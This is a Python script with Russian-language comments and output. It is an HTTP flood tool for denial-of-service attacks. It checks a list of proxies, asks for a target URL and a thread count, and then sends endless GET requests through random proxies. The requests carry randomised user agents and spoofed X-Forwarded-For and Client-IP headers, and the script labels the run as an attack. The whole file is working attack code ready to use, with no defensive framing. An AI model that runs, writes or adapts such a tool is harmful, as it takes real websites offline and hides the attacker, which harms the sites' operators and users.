import requests
import threading
import random
import string
import time
import sys
from colorama import Fore, Back, Style, init
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

# Инициализация colorama
init(autoreset=True)

# ================== ASCII АРТ ==================
def display_ascii_art():
    print(Fore.RED + """
 ____  _  _    ____  _  _    ___  ____  _  _  ____
(  _ \/ )( \  (  _ \/ )( \  / __)/ ___)/ )( \/ ___)
 )__/ ) \/ ( )   /) \/ \/ ( (__)\___ \\ /\ /\  ( 
(__)  (__/  (___/  \____/\___)(____)(__\_)(__/\_|  
    """ + Style.RESET_ALL)

display_ascii_art()

# ================== НАСТРОЙКИ ==================
PROXY_FILE = 'working_proxies.txt'  # Файл с прокси
CHECK_URL = 'https://api.ipify.org' # Для проверки прокси
TIMEOUT = 8
MAX_CHECK_WORKERS = 30
# ===============================================

# Глобальные переменные
target_url = ""
num_attackers = 0
ua = UserAgent()
valid_proxies = []
lock = threading.Lock()

# ================== ЦВЕТНЫЕ ЛОГИ ==================
def log_success(msg):
    print(Fore.GREEN + f"[+] {msg}" + Style.RESET_ALL)

def log_error(msg):
    print(Fore.RED + f"[-] {msg}" + Style.RESET_ALL)

def log_info(msg):
    print(Fore.CYAN + f"[*] {msg}" + Style.RESET_ALL)

# ================== ЗАГРУЗКА ПРОКСИ ==================
def load_proxies():
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        log_info(f"Загружено {len(proxies)} прокси из {PROXY_FILE}")
        return proxies
    except FileNotFoundError:
        log_error(f"Файл {PROXY_FILE} не найден!")
        sys.exit(1)

# ================== ПРОВЕРКА ОДНОГО ПРОКСИ ==================
def check_proxy(proxy):
    proxies_dict = {'http': proxy, 'https': proxy}
    try:
        response = requests.get(
            CHECK_URL,
            proxies=proxies_dict,
            timeout=TIMEOUT,
            headers={'User-Agent': ua.random},
            verify=False
        )
        if response.status_code == 200:
            proxy_ip = response.text.strip()
            return proxy, True, proxy_ip
        return proxy, False, None
    except:
        return proxy, False, None

# ================== ПРОВЕРКА ВСЕХ ПРОКСИ ==================
def validate_proxies():
    global valid_proxies
    raw_proxies = load_proxies()
    log_info(f"Проверка {len(raw_proxies)} прокси...")

    working = []
    with ThreadPoolExecutor(max_workers=MAX_CHECK_WORKERS) as executor:
        results = executor.map(check_proxy, raw_proxies)
        for proxy, works, ip in results:
            if works:
                working.append(proxy)
                log_success(f"{proxy} → {ip}")
            else:
                log_error(f"{proxy} — НЕ РАБОТАЕТ")

    valid_proxies = working
    if not valid_proxies:
        log_error("НИ ОДИН ПРОКСИ НЕ РАБОТАЕТ! Выход.")
        sys.exit(1)
    log_info(f"ГОТОВО: {len(valid_proxies)} рабочих прокси")

# ================== РАНДОМНЫЕ ДАННЫЕ ==================
def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_client():
    clients = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B)",
        "Googlebot/2.1",
        "curl/7.68.0",
        "Python-urllib/3.11"
    ]
    return random.choice(clients) + " " + random_string(8)

# ================== АТАКА ==================
def attack():
    while True:
        proxy = random.choice(valid_proxies) if valid_proxies else None
        proxies_dict = {'http': proxy, 'https': proxy} if proxy else None
        
        headers = {
            'User-Agent': random_client(),
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

        try:
            response = requests.get(
                target_url,
                headers=headers,
                proxies=proxies_dict,
                timeout=10,
                verify=False
            )
            status = response.status_code
            proxy_name = proxy.split('@')[-1].split(':')[0] if proxy else "ПРЯМОЙ"
            print(Fore.GREEN + f"АТАКА → {proxy_name} | {status} | {target_url[:40]}..." + Style.RESET_ALL)
        except:
            print(Fore.YELLOW + f"ОШИБКА → {proxy.split('@')[-1].split(':')[0] if proxy else 'ПРЯМОЙ'} | {target_url[:40]}..." + Style.RESET_ALL)

# ================== ОСНОВНОЙ ЗАПУСК ==================
def main():
    global target_url, num_attackers

    target_url = input(Fore.CYAN + "Введи URL: " + Style.RESET_ALL).strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    try:
        num_attackers = int(input(Fore.CYAN + "Потоков: " + Style.RESET_ALL))
    except:
        log_error("Неверное число потоков!")
        sys.exit(1)

    # Проверка прокси
    validate_proxies()

    log_info(f"ЗАПУСК АТАКИ: {num_attackers} потоков → {target_url}")
    log_info("Ctrl+C — остановить\n")
    time.sleep(2)

    # Запуск потоков
    threads = []
    for i in range(num_attackers):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\nОСТАНОВКА АТАКИ..." + Style.RESET_ALL)
        sys.exit(0)

# ================== ЗАПУСК ==================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\nАТАКА ОСТАНОВЛЕНА." + Style.RESET_ALL)